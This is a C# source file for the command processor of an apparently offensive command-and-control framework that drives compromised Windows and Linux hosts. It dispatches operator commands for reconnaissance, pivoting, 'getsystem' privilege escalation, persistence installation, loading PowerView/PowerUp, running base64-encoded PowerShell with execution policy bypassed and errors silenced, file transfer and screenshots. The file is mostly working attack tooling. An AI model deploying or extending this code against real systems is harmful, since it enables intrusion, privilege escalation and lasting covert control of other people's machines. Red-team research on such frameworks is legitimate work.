
using C2Framework;
using System.Text;

public class C2CommandProcessor
{
    private readonly C2Server _server;
    private Dictionary<string, string> _builtInCommands;
    private Dictionary<string, string> _linuxCommands;
    private string _lastCommandOperatorId = null;
    private string _currentDirectory = string.Empty;
    private SCShellPivotManager _scShellPivotManager;
    private PersistenceManager _persistenceManager;
    private PrivilegeEscalationManager _privilegeEscalationManager;
    private Dictionary<string, bool> _persistentPSSession = new Dictionary<string, bool>();
    private Dictionary<string, List<string>> _clientLoadedModules = new Dictionary<string, List<string>>();

    public C2CommandProcessor(C2Server server)
    {
        _server = server;
        InitializeCommandDictionaries();
        InitializeManagers();
    }

    private void InitializeCommandDictionaries()
    {
        _builtInCommands = new Dictionary<string, string>
        {
            { "whoami", "whoami" },
            { "hostname", "hostname" },
            { "netinfo", "ipconfig /all" },
            { "ls", "dir /b" },
            { "dir", "dir" },
            { "ll", "dir /q" },
            { "ps", "tasklist" },
            { "users", "net user" },
            { "pwd", "cd" },
            { "cat", "type" }
        };

        _linuxCommands = new Dictionary<string, string>
        {
            { "netinfo", "ip addr show 2>/dev/null || ifconfig 2>/dev/null" },
            { "ls", "ls -la" },
            { "dir", "ls -la" },
            { "ll", "ls -la" },
            { "ps", "ps aux" },
            { "users", "cut -d: -f1 /etc/passwd" },
            { "pwd", "pwd" },
            { "cat", "cat" }
        };
    }

    private void InitializeManagers()
    {
        _persistenceManager = new PersistenceManager(_server);
        _persistenceManager.OutputMessage += (sender, e) =>
        {
            _server.SafeRaiseOutputMessage(e.Message, e.Color);
        };

        _privilegeEscalationManager = new PrivilegeEscalationManager(_server);
        _privilegeEscalationManager.OutputMessage += (sender, e) =>
        {
            _server.SafeRaiseOutputMessage(e.Message, e.Color);
        };
    }

    public void SendCommand(string command, ClientHandler activeClient)
    {
        if (activeClient == null)
        {
            _server.RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
            return;
        }

        // Handle pivot commands
        if (command.ToLower().StartsWith("pivot"))
        {
            Task.Run(async () =>
            {
                try
                {
                    if (_scShellPivotManager == null)
                    {
                        _scShellPivotManager = new SCShellPivotManager(_server, activeClient);
                        _scShellPivotManager.OutputMessage += (s, e) =>
                        {
                            _server.RaiseOutputMessage(e.Message, e.Color);
                        };
                    }
                    await _scShellPivotManager.HandlePivotCommand(command);
                }
                catch (Exception ex)
                {
                    _server.RaiseOutputMessage($"[!] Pivot error: {ex.Message}", Color.Red);
                }
            });
            return;
        }

        // Handle privilege escalation commands
        if (command.ToLower().StartsWith("getsystem"))
        {
            HandlePrivilegeEscalationCommand(command, activeClient);
            return;
        }

        // Handle persistence commands
        if (command.ToLower().StartsWith("persistence"))
        {
            HandlePersistenceCommand(command, activeClient);
            return;
        }

        // Handle help command
        if (command.ToLower() == "help" || command.ToLower() == "?")
        {
            ShowClientHelp(activeClient);
            return;
        }

        bool isOperatorCommand = !string.IsNullOrEmpty(_lastCommandOperatorId);

        if (!isOperatorCommand)
        {
            string activeClientId = activeClient?.ClientId ?? "None";
            _server.RaiseOutputMessage($"[{DateTime.Now:HH:mm:ss}][{activeClientId}] > {command}", Color.Blue);

            if (_server.IsOperatorServerRunning)
            {
                _server.BroadcastServerCommand(command, activeClientId);
            }
        }

        _lastCommandOperatorId = null;

        // Auto-redirect stderr for Linux commands
        if (activeClient.IsLinux)
        {
            command = AutoRedirectStderr(command);
        }

        string[] parts = command.Split(new char[] { ' ' }, 2);
        string cmd = parts[0].ToLower();
        string arguments = parts.Length > 1 ? parts[1] : string.Empty;

        // Warn about PowerShell on plain text connections
        if (!activeClient.IsEncrypted && !activeClient.IsLinux)
        {
            if (command.StartsWith("powershell", StringComparison.OrdinalIgnoreCase) ||
                command.StartsWith("Get-", StringComparison.OrdinalIgnoreCase) ||
                command.Contains("$"))
            {

            }
        }

        // Process commands based on client type
        if (activeClient.IsLinux)
        {
            HandleLinuxCommand(cmd, arguments, activeClient, command);
        }
        else
        {
            HandleWindowsCommand(cmd, arguments, activeClient, command);
        }
    }

    private void HandleLinuxCommand(string cmd, string arguments, ClientHandler activeClient, string originalCommand)
    {
        if (cmd == "cd")
        {
            if (string.IsNullOrEmpty(arguments))
            {
                activeClient.SendCommand("pwd");
            }
            else
            {
                activeClient.SendCommand($"cd {arguments} 2>&1 && pwd");
            }
            return;
        }

        if (_linuxCommands.ContainsKey(cmd))
        {
            string translatedCommand = _linuxCommands[cmd];
            if (!string.IsNullOrEmpty(arguments))
                translatedCommand += " " + arguments;

            translatedCommand = AutoRedirectStderr(translatedCommand);
            activeClient.SendCommand(translatedCommand);
            return;
        }

        activeClient.SendCommand(originalCommand);
    }

    private void HandleWindowsCommand(string cmd, string arguments, ClientHandler activeClient, string originalCommand)
    {
        if (cmd == "cd")
        {
            if (activeClient.IsEncrypted)
            {
                activeClient.SendCommand($"##CD_COMMAND##{arguments}");
            }
            else
            {
                HandlePlainTextDirectoryChange(arguments, activeClient);
            }
            return;
        }

        if (_builtInCommands.ContainsKey(cmd))
        {
            string translatedCommand = _builtInCommands[cmd];
            if (!string.IsNullOrEmpty(arguments))
                translatedCommand += " " + arguments;

            activeClient.SendCommand(translatedCommand);
            return;
        }

        if (cmd == "powershell" || cmd == "ps")
        {
            if (string.IsNullOrEmpty(arguments))
            {
                _server.RaiseOutputMessage("[!] Usage: powershell <command>", Color.Red);
                return;
            }

            // Handle import-module commands
            if (arguments.ToLower().StartsWith("import-module"))
            {
                HandleImportModule(arguments, activeClient);
                return;
            }

            // Handle viewing imported modules
            if (arguments.ToLower() == "get-module" || arguments.ToLower() == "modules")
            {
                HandleGetModules(activeClient);
                return;
            }

            // Handle clearing modules
            if (arguments.ToLower() == "clear-modules" || arguments.ToLower() == "clearmodules")
            {
                HandleClearModules(activeClient);
                return;
            }

            // Handle saving command output to file
            if (arguments.ToLower().StartsWith("save-output") || arguments.ToLower().StartsWith("saveoutput"))
            {
                HandleSaveOutput(arguments, activeClient);
                return;
            }

            // Handle help
            if (arguments.ToLower() == "help")
            {
                ShowPowerShellHelp();
                return;
            }

            // Execute PowerShell command with auto-loaded modules
            ExecutePowerShellWithModules(arguments, activeClient);
            return;
        }

        activeClient.SendCommand(originalCommand);
    }


    private void HandleClearModules(ClientHandler activeClient)
    {
        try
        {
            string clientId = activeClient.ClientId;

            if (_clientLoadedModules.ContainsKey(clientId))
            {
                int count = _clientLoadedModules[clientId].Count;
                _clientLoadedModules[clientId].Clear();
                _server.RaiseOutputMessage($"[+] Cleared {count} modules from auto-load list", Color.Green);
            }
            else
            {
                _server.RaiseOutputMessage("[*] No modules were configured for auto-loading", Color.Yellow);
            }
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error clearing modules: {ex.Message}", Color.Red);
        }
    }


    private void HandleGetModules(ClientHandler activeClient)
    {
        try
        {
            string clientId = activeClient.ClientId;
            List<string> modules = _clientLoadedModules.ContainsKey(clientId) ? _clientLoadedModules[clientId] : new List<string>();

            if (modules.Count == 0)
            {
                _server.RaiseOutputMessage("[*] No modules configured for auto-loading", Color.Yellow);
                return;
            }

            _server.RaiseOutputMessage($"[+] Auto-load modules for client {clientId}:", Color.Green);
            for (int i = 0; i < modules.Count; i++)
            {
                _server.RaiseOutputMessage($"  {i + 1}. {modules[i]}", Color.Cyan);
            }

            string testScript = @"
Write-Output '[*] Currently loaded modules in PowerShell:'
Get-Module | ForEach-Object { 
    Write-Output ('  ' + $_.Name + ' (' + $_.ModuleType + ')')
}
";

            ExecuteEncodedPowerShellScript(testScript, activeClient);
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error getting modules: {ex.Message}", Color.Red);
        }
    }
    private void ExecutePowerShellWithModules(string command, ClientHandler activeClient)
    {
        try
        {
            string clientId = activeClient.ClientId;
            List<string> modules = _clientLoadedModules.ContainsKey(clientId) ? _clientLoadedModules[clientId] : new List<string>();

            if (modules.Count == 0)
            {
                // No modules to load, execute command normally
                ExecuteSinglePowerShellCommand(command, activeClient);
                return;
            }

            _server.RaiseOutputMessage($"[*] Executing with {modules.Count} pre-loaded module(s)", Color.Cyan);

            // Build script that loads modules then executes command with clean output
            StringBuilder scriptBuilder = new StringBuilder();
            scriptBuilder.AppendLine("# Suppress all noise and progress indicators");
            scriptBuilder.AppendLine("$ErrorActionPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$ProgressPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$WarningPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$VerbosePreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$DebugPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$InformationPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("");

            foreach (string module in modules)
            {
                scriptBuilder.AppendLine($"if (Test-Path '{module}') {{");
                scriptBuilder.AppendLine($"    Write-Output '[*] Loading {module}...'");
                scriptBuilder.AppendLine($"    $fullPath = Resolve-Path '{module}'");
                scriptBuilder.AppendLine($"    . $fullPath.Path 2>$null");  // Redirect errors to null
                scriptBuilder.AppendLine($"}} else {{");
                scriptBuilder.AppendLine($"    Write-Output '[!] Module not found: {module}'");
                scriptBuilder.AppendLine($"}}");
            }

            scriptBuilder.AppendLine("");
            scriptBuilder.AppendLine("# Execute the actual command - save large outputs to temp file");
            scriptBuilder.AppendLine($"try {{");
            scriptBuilder.AppendLine($"    Write-Output '[*] Executing command: {command}'");

            if (command.Contains("Invoke-AllChecks") || command.Contains("Get-NetUser") || command.Contains("Get-NetComputer") ||
                command.Contains("Get-NetGroup") || command.Contains("Find-LocalAdminAccess") || command.Contains("Get-NetFileServer"))
            {
                scriptBuilder.AppendLine($"    # Large output command - save to temp file");
                scriptBuilder.AppendLine($"    $tempFile = \"$env:TEMP\\c2_{command.Replace(' ', '_').Replace('-', '_')}_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt\"");
                scriptBuilder.AppendLine($"    Write-Output \"[*] Saving output to: $tempFile\"");
                scriptBuilder.AppendLine($"    ");
                scriptBuilder.AppendLine($"    $startTime = Get-Date");
                scriptBuilder.AppendLine($"    {command} | Out-File -FilePath $tempFile -Encoding UTF8 -Width 4096");
                scriptBuilder.AppendLine($"    $endTime = Get-Date");
                scriptBuilder.AppendLine($"    $duration = ($endTime - $startTime).TotalSeconds");
                scriptBuilder.AppendLine($"    ");
                scriptBuilder.AppendLine($"    if (Test-Path $tempFile) {{");
                scriptBuilder.AppendLine($"        $fileSize = (Get-Item $tempFile).Length");
                scriptBuilder.AppendLine($"        $lineCount = (Get-Content $tempFile | Measure-Object -Line).Lines");
                scriptBuilder.AppendLine($"        Write-Output \"[+] Command completed successfully!\"");
                scriptBuilder.AppendLine($"        Write-Output \"[*] Execution time: ${{duration:F1}} seconds\"");
                scriptBuilder.AppendLine($"        Write-Output \"[*] File size: $fileSize bytes (${{[Math]::Round($fileSize/1024, 1)}} KB)\"");
                scriptBuilder.AppendLine($"        Write-Output \"[*] Line count: $lineCount\"");
                scriptBuilder.AppendLine($"        Write-Output \"\"");
                scriptBuilder.AppendLine($"        Write-Output \"=== FULL OUTPUT ====\"");
                scriptBuilder.AppendLine($"        Write-Output \"\"");
                scriptBuilder.AppendLine($"        ");
                scriptBuilder.AppendLine($"        # Display the entire file contents");
                scriptBuilder.AppendLine($"        Get-Content $tempFile | ForEach-Object {{ Write-Output $_ }}");
                scriptBuilder.AppendLine($"        ");
                scriptBuilder.AppendLine($"        Write-Output \"\"");
                scriptBuilder.AppendLine($"        Write-Output \"=== END OF OUTPUT ====\"");
                scriptBuilder.AppendLine($"        ");
                scriptBuilder.AppendLine($"        # Clean up temp file");
                scriptBuilder.AppendLine($"        Remove-Item $tempFile -Force");
                scriptBuilder.AppendLine($"        Write-Output \"[*] Temp file cleaned up\"");
                scriptBuilder.AppendLine($"    }} else {{");
                scriptBuilder.AppendLine($"        Write-Output \"[!] No output file created\"");
                scriptBuilder.AppendLine($"    }}");
            }
            else
            {
                // Small output commands - display normally
                scriptBuilder.AppendLine($"    $result = {command} 2>&1");
                scriptBuilder.AppendLine($"    if ($result) {{");
                scriptBuilder.AppendLine($"        $result | Out-String -Width 4096 | Write-Output");
                scriptBuilder.AppendLine($"    }} else {{");
                scriptBuilder.AppendLine($"        Write-Output '[*] Command completed with no output'");
                scriptBuilder.AppendLine($"    }}");
            }

            scriptBuilder.AppendLine($"}} catch {{");
            scriptBuilder.AppendLine($"    Write-Output \"[!] Command error: $($_.Exception.Message)\"");
            scriptBuilder.AppendLine($"    Write-Output \"[!] Error type: $($_.Exception.GetType().Name)\"");
            scriptBuilder.AppendLine($"}}");
            scriptBuilder.AppendLine("");
            scriptBuilder.AppendLine("Write-Output '[END]'");

            string fullScript = scriptBuilder.ToString();
            ExecuteEncodedPowerShellScript(fullScript, activeClient);
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error executing PowerShell with modules: {ex.Message}", Color.Red);
        }
    }


    private void HandleSaveOutput(string arguments, ClientHandler activeClient)
    {
        try
        {
            string[] parts = arguments.Split(new char[] { ' ' }, 3, StringSplitOptions.RemoveEmptyEntries);

            if (parts.Length < 3)
            {
                _server.RaiseOutputMessage("[!] Usage: save-output <filename> <command>", Color.Red);
                _server.RaiseOutputMessage("    Examples:", Color.Cyan);
                _server.RaiseOutputMessage("      save-output allchecks.txt Invoke-AllChecks", Color.Cyan);
                _server.RaiseOutputMessage("      save-output users.txt Get-NetUser", Color.Cyan);
                _server.RaiseOutputMessage("      save-output computers.txt Get-NetComputer", Color.Cyan);
                return;
            }

            string filename = parts[1];
            string command = parts[2];
            string clientId = activeClient.ClientId;

            _server.RaiseOutputMessage($"[*] Executing {command} and saving to {filename}", Color.Yellow);

            List<string> modules = _clientLoadedModules.ContainsKey(clientId) ? _clientLoadedModules[clientId] : new List<string>();

            StringBuilder scriptBuilder = new StringBuilder();
            scriptBuilder.AppendLine("# Suppress all noise");
            scriptBuilder.AppendLine("$ErrorActionPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$ProgressPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$WarningPreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("$VerbosePreference = 'SilentlyContinue'");
            scriptBuilder.AppendLine("");

            // Load modules
            foreach (string module in modules)
            {
                scriptBuilder.AppendLine($"if (Test-Path '{module}') {{");
                scriptBuilder.AppendLine($"    $fullPath = Resolve-Path '{module}'");
                scriptBuilder.AppendLine($"    . $fullPath.Path 2>$null");
                scriptBuilder.AppendLine($"}}");
            }

            scriptBuilder.AppendLine("");
            scriptBuilder.AppendLine($"try {{");
            scriptBuilder.AppendLine($"    Write-Output '[*] Executing {command}...'");
            scriptBuilder.AppendLine($"    $output = {command} 2>&1 | Out-String -Width 4096");
            scriptBuilder.AppendLine($"    $output | Out-File -FilePath '{filename}' -Encoding UTF8");
            scriptBuilder.AppendLine($"    $fileSize = (Get-Item '{filename}').Length");
            scriptBuilder.AppendLine($"    Write-Output '[+] Output saved to {filename}'");
            scriptBuilder.AppendLine($"    Write-Output \"[*] File size: $fileSize bytes\"");
            scriptBuilder.AppendLine($"    Write-Output '[*] Use download {filename} to retrieve the file'");
            scriptBuilder.AppendLine($"}} catch {{");
            scriptBuilder.AppendLine($"    Write-Output \"[!] Save error: $($_.Exception.Message)\"");
            scriptBuilder.AppendLine($"}}");

            string fullScript = scriptBuilder.ToString();
            ExecuteEncodedPowerShellScript(fullScript, activeClient);
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error handling save-output: {ex.Message}", Color.Red);
        }
    }



    private void ExecuteEncodedPowerShellScript(string script, ClientHandler activeClient)
    {
        try
        {
            string encodedScript = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            string command = $"powershell.exe -ExecutionPolicy Bypass -OutputFormat Text -EncodedCommand {encodedScript}";
            activeClient.SendCommand(command);
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error executing PowerShell script: {ex.Message}", Color.Red);
        }
    }

    private void ExecuteSinglePowerShellCommand(string arguments, ClientHandler activeClient)
    {
        if (!activeClient.IsEncrypted)
        {
            activeClient.SendCommand($"powershell.exe -ExecutionPolicy Bypass -OutputFormat Text -NoProfile -Command \"{arguments}\"");
        }
        else
        {
            activeClient.SendCommand($"powershell.exe -ExecutionPolicy Bypass -OutputFormat Text -Command \"{arguments}\"");
        }
    }
    private void HandleImportModule(string arguments, ClientHandler activeClient)
    {
        try
        {
            string[] parts = arguments.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

            if (parts.Length < 2)
            {
                _server.RaiseOutputMessage("[!] Usage: import-module <script_path>", Color.Red);
                _server.RaiseOutputMessage("    Examples:", Color.Cyan);
                _server.RaiseOutputMessage("      import-module PowerView.ps1", Color.Cyan);
                _server.RaiseOutputMessage("      import-module C:\\Tools\\PowerView.ps1", Color.Cyan);
                _server.RaiseOutputMessage("      import-module .\\PowerUp.ps1", Color.Cyan);
                return;
            }

            string scriptPath = parts[1];
            string clientId = activeClient.ClientId;

            _server.RaiseOutputMessage($"[*] Adding {scriptPath} to auto-load modules", Color.Yellow);

            // Initialize client's module list if needed
            if (!_clientLoadedModules.ContainsKey(clientId))
            {
                _clientLoadedModules[clientId] = new List<string>();
            }

            // Add to client's loaded modules if not already there
            if (!_clientLoadedModules[clientId].Contains(scriptPath))
            {
                _clientLoadedModules[clientId].Add(scriptPath);
            }

            // Test the import by executing it directly
            string testImportScript = $@"
try {{
    if (!(Test-Path '{scriptPath}')) {{
        Write-Output '[!] SCRIPT_ERROR: Script file not found at {scriptPath}'
        exit 1
    }}
    
    Write-Output '[*] Testing dot-source of {scriptPath}...'
    $fullPath = Resolve-Path '{scriptPath}'
    . $fullPath.Path
    Write-Output '[+] Dot-source successful!'
    
    # Test by checking for common PowerView/PowerUp functions
    $testFunctions = @('Get-NetDomain', 'Get-NetUser', 'Get-NetComputer', 'Get-NetGroup', 'Invoke-AllChecks', 'Get-UnquotedService', 'Get-ModifiableServiceFile')
    $foundFunctions = @()
    foreach ($func in $testFunctions) {{
        if (Get-Command $func -ErrorAction SilentlyContinue) {{
            $foundFunctions += $func
        }}
    }}
    
    if ($foundFunctions.Count -gt 0) {{
        Write-Output '[*] Functions detected: ' + ($foundFunctions -join ', ')
    }} else {{
        Write-Output '[*] No test functions found - script may have loaded other functions'
    }}
    
}} catch {{
    Write-Output '[!] IMPORT_ERROR: ' + $_.Exception.Message
}}
";

            ExecuteEncodedPowerShellScript(testImportScript, activeClient);

            _server.RaiseOutputMessage($"[+] Module {scriptPath} added to auto-load list", Color.Green);
            _server.RaiseOutputMessage($"[*] Module will be loaded automatically with future PowerShell commands", Color.Cyan);
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error handling import-module: {ex.Message}", Color.Red);
        }
    }

    private void ShowPowerShellHelp()
    {
        StringBuilder help = new StringBuilder();
        help.AppendLine("\n=== Enhanced PowerShell Commands ===");
        help.AppendLine("");
        help.AppendLine("Module Management:");
        help.AppendLine("  import-module <path>          - Add script to auto-load list");
        help.AppendLine("  get-module                    - Show auto-load modules & test functions");
        help.AppendLine("  clear-modules                 - Clear auto-load module list");
        help.AppendLine("  save-output <file> <cmd>      - Save large output to file");
        help.AppendLine("");
        help.AppendLine("Examples:");
        help.AppendLine("  powershell import-module PowerView.ps1");
        help.AppendLine("  powershell Get-NetDomain");
        help.AppendLine("  powershell import-module PowerUp.ps1");
        help.AppendLine("  powershell Invoke-AllChecks");
        help.AppendLine("");
        _server.RaiseOutputMessage(help.ToString(), Color.Cyan);
    }
    private string AutoRedirectStderr(string command)
    {
        if (command.Contains("2>&1") || command.Contains("2>"))
        {
            return command;
        }

        string trimmed = command.Trim().ToLower();

        string[] stderrCommands = {
            "wget", "curl", "git", "rsync", "scp", "ssh", "ping", "traceroute","su",
            "nmap", "masscan", "nikto", "sqlmap", "hydra", "john", "hashcat",
            "ffmpeg", "youtube-dl", "pip", "npm", "apt", "yum", "dnf", "pacman",
            "docker", "kubectl", "terraform", "ansible", "vagrant", "mvn", "gradle",
            "make", "cmake", "gcc", "g++", "clang", "go", "rustc", "cargo",
            "python3", "node", "ruby", "php", "java", "scala", "kotlin"
        };

        foreach (string cmd in stderrCommands)
        {
            if (trimmed.StartsWith(cmd + " ") || trimmed == cmd)
            {
                return command + " 2>&1";
            }
        }

        if (trimmed.StartsWith("su ") || trimmed == "su")
        {
            return command + " 2>&1";
        }

        if (trimmed.StartsWith("sudo "))
        {
            return command + " 2>&1";
        }

        return command;
    }

    private void HandlePlainTextDirectoryChange(string arguments, ClientHandler activeClient)
    {
        if (string.IsNullOrEmpty(arguments))
        {
            activeClient.SendCommand("pwd");
            return;
        }

        string cleanPath = arguments.Trim().Trim('"').Trim('\'');

        string cmd;
        if (cleanPath == "/" || cleanPath == "\\")
        {
            cmd = "cd \\; pwd";
        }
        else if (cleanPath == "..")
        {
            cmd = "cd ..; pwd";
        }
        else if (cleanPath.Contains(" "))
        {
            cmd = $"cd \"{cleanPath}\"; pwd";
        }
        else
        {
            cmd = $"cd {cleanPath}; pwd";
        }

        activeClient.SendCommand(cmd);
    }

    private void HandlePrivilegeEscalationCommand(string command, ClientHandler activeClient)
    {
        _privilegeEscalationManager.SetActiveClient(activeClient);

        var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length == 1)
        {
            // Just "getsystem" - use default method
            Task.Run(async () => await _privilegeEscalationManager.ExecutePrivilegeEscalation("task"));
        }
        else if (parts.Length >= 2)
        {
            string method = parts[1].ToLower();
            string agentPath = parts.Length > 2 ? string.Join(" ", parts.Skip(2)) : null;

            Task.Run(async () => await _privilegeEscalationManager.ExecutePrivilegeEscalation(method, agentPath));
        }
    }

    private void HandlePersistenceCommand(string command, ClientHandler activeClient)
    {
        _persistenceManager.SetActiveClient(activeClient);

        var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length == 1)
        {
            // Just "persistence" - show menu
            Task.Run(async () => await _persistenceManager.ShowPersistenceMenu());
        }
        else if (parts.Length >= 2)
        {
            string method = parts[1].ToLower();
            string agentPath = parts.Length > 2 ? string.Join(" ", parts.Skip(2)) : null;

            if (activeClient.IsLinux)
            {
                if (method == "cron" || method == "systemd" || method == "bashrc")
                {
                    Task.Run(async () => await _persistenceManager.InstallLinuxPersistenceWithPath(agentPath ?? ""));
                }
                else
                {
                    Task.Run(async () => await _persistenceManager.ShowLinuxPersistenceMenuWithTime());
                }
            }
            else
            {
                if (int.TryParse(method, out int methodNum))
                {
                    Task.Run(async () => await _persistenceManager.InstallWindowsPersistence(methodNum, agentPath));
                }
                else
                {
                    Task.Run(async () => await _persistenceManager.ShowPersistenceMenu());
                }
            }
        }
    }

    private void ShowClientHelp(ClientHandler activeClient)
    {
        if (activeClient == null)
        {
            _server.RaiseOutputMessage("[!] No active session. Connect to a client first.", Color.Red);
            return;
        }

        StringBuilder help = new StringBuilder();
        help.AppendLine($"\n=== Available Commands for {activeClient.ClientId} ===");
        help.AppendLine($"Connection Type: {(activeClient.IsEncrypted ? "Encrypted (TLS)" : "Plain Text")}");
        help.AppendLine($"Shell Type: {activeClient.ShellType}");
        help.AppendLine($"OS: {(activeClient.IsLinux ? "Linux/Unix" : "Windows")}");

        // Show loaded modules count
        string clientId = activeClient.ClientId;
        int moduleCount = _clientLoadedModules.ContainsKey(clientId) ? _clientLoadedModules[clientId].Count : 0;
        help.AppendLine($"Auto-load Modules: {moduleCount}");
        help.AppendLine("");

        if (activeClient.IsLinux)
        {
            help.AppendLine("Linux Commands:");
            help.AppendLine("  Basic: ls, pwd, cd, cat, whoami, hostname");
            help.AppendLine("  System: ps, netinfo, users, uname -a");
            help.AppendLine("  Network: netstat -an, ip addr, ifconfig");
            help.AppendLine("  Files: find, grep, chmod, chown");
        }
        else
        {
            help.AppendLine("Windows Commands:");
            help.AppendLine("  Basic: dir, cd, type, whoami, hostname");
            help.AppendLine("  System: systeminfo, tasklist, net user");
            help.AppendLine("  Network: ipconfig, netstat -an, arp -a");

            if (activeClient.ShellType == "powershell" || !activeClient.IsEncrypted)
            {
                help.AppendLine("");
                help.AppendLine("PowerShell Commands:");
                help.AppendLine("  powershell import-module <path> - Add script to auto-load");
                help.AppendLine("  powershell <command>          - Execute PowerShell command");
                help.AppendLine("  powershell get-module         - Show loaded modules");
                help.AppendLine("  powershell clear-modules      - Clear auto-load list");
                help.AppendLine("  powershell help               - Show detailed PowerShell help");
            }

            if (activeClient.IsAdmin)
            {
                help.AppendLine("");
                help.AppendLine("Admin Commands:");
                help.AppendLine("  getsystem - Elevate to SYSTEM");
                help.AppendLine("  persistence - Add persistence");
                help.AppendLine("  net user /add - Add users");
            }
        }

        help.AppendLine("");
        help.AppendLine("C2 Commands:");
        help.AppendLine("  download <file> - Download file from client");
        help.AppendLine("  upload <local> <remote> - Upload file to client");
        help.AppendLine("  screenshot - Take screenshot (Windows only)");
        help.AppendLine("  help - Show this help");
        help.AppendLine("  exit - Close current session");

        _server.RaiseOutputMessage(help.ToString(), Color.Cyan);
    }
    public void SetLastCommandOperatorId(string operatorId)
    {
        _lastCommandOperatorId = operatorId;
    }

    // Delegation methods for privilege escalation
    public void ElevateToSystemUsingTask()
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        _privilegeEscalationManager.ElevateToSystemUsingTask();
    }

    public void ElevateToSystemUsingService()
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        _privilegeEscalationManager.ElevateToSystemUsingService();
    }

    public async Task ElevateToSystemWithUpload(string agentLocalPath)
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        await _privilegeEscalationManager.ElevateToSystemWithUpload(agentLocalPath);
    }

    public async Task ElevateToSystemUsingServiceWithUpload(string agentLocalPath)
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        await _privilegeEscalationManager.ElevateToSystemUsingServiceWithUpload(agentLocalPath);
    }

    public void ShowPrivilegeEscalationHelp()
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        _privilegeEscalationManager.ShowPrivilegeEscalationHelp();
    }

    public async Task ExecutePrivilegeEscalation(string method, string agentPath = null)
    {
        _privilegeEscalationManager.SetActiveClient(_server.GetActiveClient());
        await _privilegeEscalationManager.ExecutePrivilegeEscalation(method, agentPath);
    }

    // Delegation methods for persistence
    public void AddPersistence()
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        _persistenceManager.AddPersistence();
    }

    public async Task ShowPersistenceMenu()
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.ShowPersistenceMenu();
    }

    public async Task InstallWindowsPersistence(int method, string agentPath = null)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.InstallWindowsPersistence(method, agentPath);
    }

    public async Task InstallLinuxPersistence(string agentPath = null)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.InstallLinuxPersistence(agentPath);
    }

    public async Task ShowLinuxPersistenceMenuWithTime()
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.ShowLinuxPersistenceMenuWithTime();
    }

    public void ProcessLinuxPersistCommand(string command)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        _persistenceManager.ProcessLinuxPersistCommand(command);
    }

    public async Task InstallLinuxPersistenceWithTime(int timeSeconds = 0, string agentPath = null)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.InstallLinuxPersistenceWithTime(timeSeconds, agentPath);
    }
    public async Task CleanupWindowsPersistence()
    {
        if (_persistenceManager == null)
        {
            _persistenceManager = new PersistenceManager(_server);
            _persistenceManager.OutputMessage += (sender, e) =>
            {
                _server.RaiseOutputMessage(e.Message, e.Color);
            };
        }

        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.CleanupWindowsPersistence();
    }
    public async Task CleanupLinuxTimedPersistence()
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.CleanupLinuxTimedPersistence();
    }

    public async Task CleanupLinuxPersistence()
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.CleanupLinuxPersistence();
    }

    public async Task InstallLinuxPersistenceWithPath(string agentPath)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.InstallLinuxPersistenceWithPath(agentPath);
    }

    public async Task InstallWindowsPersistenceWithPath(int method, string agentPath)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.InstallWindowsPersistenceWithPath(method, agentPath);
    }

    public async Task AddPersistenceWithUpload(string agentLocalPath)
    {
        _persistenceManager.SetActiveClient(_server.GetActiveClient());
        await _persistenceManager.AddPersistenceWithUpload(agentLocalPath);
    }
}